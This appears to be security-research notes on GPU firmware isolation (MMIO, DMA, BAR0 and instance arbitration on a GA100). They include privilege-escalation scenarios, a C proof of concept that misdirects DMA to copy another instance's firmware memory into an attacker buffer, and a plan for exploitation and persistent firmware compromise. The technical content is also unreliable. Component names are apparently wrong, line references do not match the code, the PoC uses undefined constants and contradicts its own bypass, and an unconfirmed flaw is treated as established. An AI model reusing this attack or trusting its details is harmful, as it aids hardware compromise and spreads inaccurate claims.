# 4.2 — GPU Isolation: FECS, DMA, and MMIO

## Overview

GA100 provides two primary mechanisms for accessing physical hardware resources:

1. **MMIO (Memory-Mapped I/O)**: Direct register reads/writes through CPU-like instructions
2. **DMA (Direct Memory Access)**: Bulk data transfers without firmware intervention

Both mechanisms are subject to isolation boundaries enforced by the FECS (Front-End Coherence System) arbiter. This document details how these access paths work and where security gaps exist.

---

## MMIO Access (Memory-Mapped I/O)

### Purpose
Firmware directly reads/writes GPU hardware registers to configure devices, query status, and control operations

### Access Pattern

```
Falcon Firmware
      ↓
   mmio_write(0x600100, value)  // Write to register
      ↓
[Register Address Decoder] (calculates actual register)
      ↓
[Hardware Register Bank] (physically executes operation)
```

### Implementation

```c
// Simplified MMIO access from Falcon firmware
void mmio_write(uint32_t address, uint32_t value) {
    // Direct memory write to BAR0 (Base Address Register 0)
    // BAR0 is GPU's register aperture mapped into memory space
    
    volatile uint32_t* reg = (volatile uint32_t*)(BAR0_BASE + address);
    *reg = value;
}

uint32_t mmio_read(uint32_t address) {
    volatile uint32_t* reg = (volatile uint32_t*)(BAR0_BASE + address);
    return *reg;
}
```

### Instance-Aware MMIO

Instance-specific registers are accessed through address calculation:

```c
// Access instance-specific register
uint32_t addr = NV_GET_PGRAPH_SMC_REG(SMC_BASE, instance_id, offset);
uint32_t value = mmio_read(addr);
```

**Vulnerability**: If `instance_id` is unchecked, address calculation can target wrong register bank or even different hardware regions

### Trust Model

**Implicit Assumptions**:
- Calculated addresses are always valid register locations
- No overflow in address arithmetic
- Register access is safe at any address

**Reality**:
- Address calculation can overflow
- Register addresses may overlap different hardware
- No bounds checking at address generation

---

## DMA (Direct Memory Access)

### Purpose
Firmware performs bulk memory transfers without involving CPU, enabling efficient data movement

### DMA Components

```
[Falcon Firmware]
        ↓
[DMA Controller]  ← Configured via MMIO
        ↓
[FECS Arbiter]    ← Instance-based arbitration
        ↓
[System Memory]   ← Physical memory access
```

### DMA Request Types

**Host-to-GPU DMA**:
```
System RAM → GPU DRAM
Used for: Firmware image loading, texture uploads, command buffers
```

**GPU-to-Host DMA**:
```
GPU DRAM → System RAM
Used for: Results readback, profiling data, error reporting
```

**GPU-to-GPU DMA**:
```
GPU Partition 0 ↔ GPU Partition 1
Used for: Inter-instance data movement
```

### DMA Setup

```c
// From acr_dma_ga100.c - Setting up DMA transfer
void setup_dma_transfer(uint32_t instance_id, uint64_t src, uint64_t dst, uint32_t size) {
    // 1. Get DMA controller registers for instance
    uint32_t dma_base = NV_GET_PGRAPH_SMC_REG(DMA_BASE, instance_id, 0);
    
    // 2. Configure source and destination addresses
    mmio_write(dma_base + DMA_SRC_OFFSET, src);
    mmio_write(dma_base + DMA_DST_OFFSET, dst);
    mmio_write(dma_base + DMA_SIZE_OFFSET, size);
    
    // 3. Configure transfer direction
    uint32_t ctrl = DMA_ENABLE | DMA_READ;  // Host-to-GPU
    mmio_write(dma_base + DMA_CTRL_OFFSET, ctrl);
    
    // 4. Trigger DMA
    mmio_write(dma_base + DMA_GO_OFFSET, 1);
}
```

**Critical Vulnerabilities in This Flow**:
1. Line 3: `instance_id` unchecked → wrong DMA controller targeted
2. Line 5: `dma_base` calculated without overflow checking
3. Line 8-10: Addresses configured without validation
4. Line 14: DMA executes with potentially attacker-chosen addresses

### DMA Address Validation

**FECS Arbitration**:
```
For each DMA request:
1. Extract instance ID from DMA controller
2. Look up instance's memory partition
3. Validate source address is in partition
4. Validate destination address is in partition
5. Grant or deny DMA access
```

**Vulnerability**: If instance ID is invalid, partition lookup fails or uses wrong partition

### Memory Protection

**Instance Memory Partitions**:
```
System Memory Layout:
┌─────────────────────────────────────────┐
│ Instance 0 Partition [base0, limit0)    │
├─────────────────────────────────────────┤
│ Instance 1 Partition [base1, limit1)    │
├─────────────────────────────────────────┤
│ Instance 2 Partition [base2, limit2)    │
├─────────────────────────────────────────┤
│ Shared Memory (untrusted driver region) │
└─────────────────────────────────────────┘

DMA must respect partition boundaries
```

**Protection Mechanism**:
```c
// FECS validation logic
bool validate_dma_address(uint32_t instance_id, uint64_t address) {
    // CRITICAL: instance_id must be validated first
    if (instance_id >= NUM_INSTANCES) {
        return false;  // Invalid instance
    }
    
    // Get partition boundaries
    uint64_t partition_base = get_partition_base(instance_id);
    uint64_t partition_limit = get_partition_limit(instance_id);
    
    // Check address is in partition
    return (address >= partition_base) && (address < partition_limit);
}
```

**Gap**: If instance_id validation is missing, get_partition_base/limit use unchecked index

---

## BAR0 (Base Address Register 0)

### Purpose
Maps GPU register space into CPU memory address space, enabling MMIO access

### Configuration

```
GPU Hardware Perspective:
Register 0x600100 (SMC register)

CPU/Firmware Perspective:
Physical Address = BAR0_BASE + 0x600100

Typically:
BAR0_BASE = 0xF0000000 (mapped in GPU memory space)
Register address = 0xF0600100
```

### Access Control

**BAR0 Permissions**:
- Falcon firmware: Full access (can read/write any register)
- Driver: Limited access (only permitted registers)
- Other instances: Cannot directly access each other's BAR0 regions

**Isolation Mechanism**: Register bank selection by instance ID, not address-based ACLs

### BAR0 Regions

```
BAR0 Layout:
0x000000-0x1FFFFF: Graphics Pipeline
0x200000-0x3FFFFF: Memory System
0x400000-0x5FFFFF: FECS (DMA, Coherence)
0x600000-0x6FFFFF: SMC Arbiter
0x700000-0x7FFFFF: Falcon Microcontroller
0x800000-0xFFFFFF: Extended Regions
```

### Vulnerability: BAR0 Overflow

```c
// Calculate BAR0 address for instance register
uint32_t address = BASE_OFFSET + (instance_id * STRIDE) + register_offset;

// If instance_id is large:
// address = 0x600000 + (0xFFFFFFFF * 0x10000) + 0x100
// = 0x600000 + overflow
// Wraps to different region
```

---

## Access Control and Privilege Boundaries

### Privilege Levels in Falcon

```
Privilege Mode 0: Supervisor
├─ Can execute privileged instructions
├─ Can access any memory region
├─ Can read/write any register
└─ Can control other instances

Privilege Mode 1: User
├─ Cannot execute privileged instructions
├─ Limited memory access (instance partition)
├─ Cannot modify register permissions
└─ Cannot access other instances
```

**Gap**: Access control is not register-based, it's role-based. SMC instance validation is the only boundary.

### Privilege Escalation Scenarios

**Scenario 1: Bypass Instance Boundary**
```
1. User-mode Falcon code (Instance 0)
2. Craft instance_id = 0xFFFFFFFF
3. Access supervisor-mode register (Instance 7)
4. Escalate to supervisor privilege
```

**Scenario 2: Cross-Instance DMA**
```
1. Instance 0 (untrusted) requests DMA
2. Set destination to Instance 1's partition
3. Unvalidated instance ID → FECS grants access
4. DMA corrupts Instance 1 firmware
```

**Scenario 3: Falcon Code Injection**
```
1. Use DMA misdirection to write to Falcon instruction memory
2. Overwrite supervisor code region
3. Trigger code execution in supervisor context
4. Full GPU compromise
```

---

## DMA Controller Registers

### Register Layout (Instance-Specific)

```c
// Base address varies per instance
#define DMA_CONFIG_OFFSET          0x000
#define DMA_STATUS_OFFSET          0x004
#define DMA_SRC_ADDR_LO_OFFSET     0x008
#define DMA_SRC_ADDR_HI_OFFSET     0x00C
#define DMA_DST_ADDR_LO_OFFSET     0x010
#define DMA_DST_ADDR_HI_OFFSET     0x014
#define DMA_TRANSFER_SIZE_OFFSET   0x018
#define DMA_CTRL_OFFSET            0x01C
#define DMA_GO_OFFSET              0x020
#define DMA_INTERRUPT_OFFSET       0x024

// Full address for instance N:
// base_address = 0x400000 (FECS) + (instance_N * 0x10000)
// register_address = base_address + offset
```

### DMA Configuration Fields

```c
typedef struct {
    uint32_t src_addr_low;      // Source address (bits 31:0)
    uint32_t src_addr_high;     // Source address (bits 63:32)
    uint32_t dst_addr_low;      // Destination address (bits 31:0)
    uint32_t dst_addr_high;     // Destination address (bits 63:32)
    uint32_t transfer_size;     // Number of bytes (max 4GB)
    uint32_t direction;         // READ, WRITE, or BIDIRECTIONAL
    uint32_t priority;          // QoS priority (0=low, 3=high)
} DMA_Config;
```

### Control Flags

```c
#define DMA_ENABLE              (1 << 0)
#define DMA_GO                  (1 << 1)
#define DMA_READ                (0 << 2)
#define DMA_WRITE               (1 << 2)
#define DMA_INTERRUPT_ON_DONE   (1 << 3)
#define DMA_VALIDATE_ADDRESSES  (1 << 4)  // Should be set
```

---

## FECS Arbitration Logic

### Arbitration Flow

```
DMA Request from Instance N
    ↓
[Extract instance_id]
    ↓
[Validate instance_id in range?] ← CRITICAL: Often missing
    ↓ (if valid)
[Get memory partition base/limit]
    ↓
[Validate source address in partition?]
    ↓
[Validate destination address in partition?]
    ↓
[Grant DMA] or [Reject DMA]
```

### Validation Gaps

**Gap 1: Instance Validation**
```c
// Should validate but may not:
if (instance_id >= MAX_INSTANCES) {
    reject();  // Often missing
}
```

**Gap 2: Address Validation**
```c
// Should validate before executing DMA:
if (src_addr < partition_base || src_addr >= partition_limit) {
    reject();  // May be missing
}
```

**Gap 3: Configuration Validation**
```c
// Should validate DMA configuration:
if (transfer_size == 0) {
    reject();  // Error condition
}
if (src_addr + transfer_size > partition_limit) {
    reject();  // Partial transfer out of bounds
}
```

---

## Vulnerability Scenario: DMA Misdirection

### Attack Outline

**Goal**: Redirect DMA to access memory outside instance partition

**Prerequisites**:
- Write access to DMA controller registers
- Instance ID not validated in FECS arbitration
- Partition boundary calculation uses unchecked index

**Attack Steps**:

```
Step 1: Configure DMA with out-of-bounds instance ID
├─ Write to DMA_CONFIG_OFFSET with fake instance
└─ Firmware sets this through LSF or runtime

Step 2: Set up DMA source/destination
├─ Source: Another instance's partition
└─ Destination: Attacker-controlled buffer

Step 3: Trigger DMA transfer
├─ Write DMA_GO register
└─ FECS arbitration uses fake instance ID

Step 4: Address validation fails
├─ get_partition_base(fake_instance) returns wrong value
├─ Attacker's address appears to be in partition
└─ FECS grants access

Step 5: DMA executes
├─ Data from other instance transferred
└─ Isolation boundary compromised
```

**Impact**:
- Information disclosure from other instance
- Privilege escalation if accessing supervisor data
- Firmware corruption if destination is code region
- Denial of service by corrupting instance state

### Proof-of-Concept

```c
void dma_misdirection_attack(void) {
    uint32_t fake_instance = 0xFFFFFFFF;
    uint64_t target_address = 0x80000000;  // Other instance's firmware
    uint64_t attacker_buffer = 0x10000000; // Attacker's buffer
    
    // Configure DMA with invalid instance
    uint32_t dma_base = NV_GET_PGRAPH_SMC_REG(DMA_BASE, fake_instance, 0);
    
    // Set up to read from target_address
    mmio_write(dma_base + DMA_SRC_ADDR_LO, target_address & 0xFFFFFFFF);
    mmio_write(dma_base + DMA_SRC_ADDR_HI, target_address >> 32);
    mmio_write(dma_base + DMA_DST_ADDR_LO, attacker_buffer & 0xFFFFFFFF);
    mmio_write(dma_base + DMA_DST_ADDR_HI, attacker_buffer >> 32);
    mmio_write(dma_base + DMA_TRANSFER_SIZE, 0x10000);  // 64KB
    
    // Trigger DMA
    uint32_t ctrl = DMA_ENABLE | DMA_READ | DMA_VALIDATE_ADDRESSES;
    mmio_write(dma_base + DMA_CTRL_OFFSET, ctrl);
    mmio_write(dma_base + DMA_GO_OFFSET, 1);
    
    // Wait for completion
    while ((mmio_read(dma_base + DMA_STATUS_OFFSET) & DMA_BUSY) != 0);
    
    // Data from target_address now in attacker_buffer
}
```

---

## Security Properties

### What Should Be Protected

**Register Access**:
- [ ] Instance ID bounds checking
- [ ] Address calculation overflow detection
- [ ] Register bank validation before write

**DMA Access**:
- [ ] Instance ID validation in FECS
- [ ] Memory partition boundary enforcement
- [ ] Address range checking for entire transfer

**Cross-Instance Isolation**:
- [ ] Prevent one instance from configuring DMA for another
- [ ] Prevent register access across instance boundaries
- [ ] Prevent memory access outside partition

### Current Implementation Gaps

- [ ] No instance ID validation before NV_GET_PGRAPH_SMC_REG
- [ ] No overflow checking in address calculations
- [ ] No bounds checking on register addresses
- [ ] FECS may not validate instance ID before partition lookup
- [ ] No per-register access control

---

## Investigation Checklist

- [ ] Extract DMA configuration code from `acr_dma_ga100.c`
- [ ] Trace instance ID through DMA setup
- [ ] Identify all FECS register locations
- [ ] Map memory partition boundaries in binary
- [ ] Confirm instance ID validation is missing
- [ ] Test DMA with out-of-bounds instance ID
- [ ] Measure impact of misdirection attack
- [ ] Document privilege escalation paths

---

## Key Questions

**Q1**: Does FECS validate instance ID before arbitration?  
**A1**: UNKNOWN - Requires binary analysis of arbitration logic

**Q2**: Can DMA transfers cross instance boundaries?  
**A2**: LIKELY - If instance ID not validated before partition lookup

**Q3**: What memory regions can be accessed through DMA?  
**A3**: Depends on partition boundaries; gap allows arbitrary access if instance ID invalid

**Q4**: Can MMIO register writes reach unintended hardware?  
**A4**: YES - Address overflow in NV_GET_PGRAPH_SMC_REG calculation

**Q5**: What is the impact of DAM misdirection?  
**A5**: HIGH - Information disclosure + potential code injection

---

## Next Steps

1. **Binary Analysis**:
   - Extract DMA controller code from firmware
   - Find FECS arbitration logic
   - Confirm vulnerability in binary

2. **Testing**:
   - Develop proof-of-concept DMA misdirection
   - Test with invalid instance IDs
   - Measure accessible memory regions

3. **Exploitation**:
   - Chain with other vulnerabilities
   - Achieve persistent firmware compromise
   - Document complete attack chain

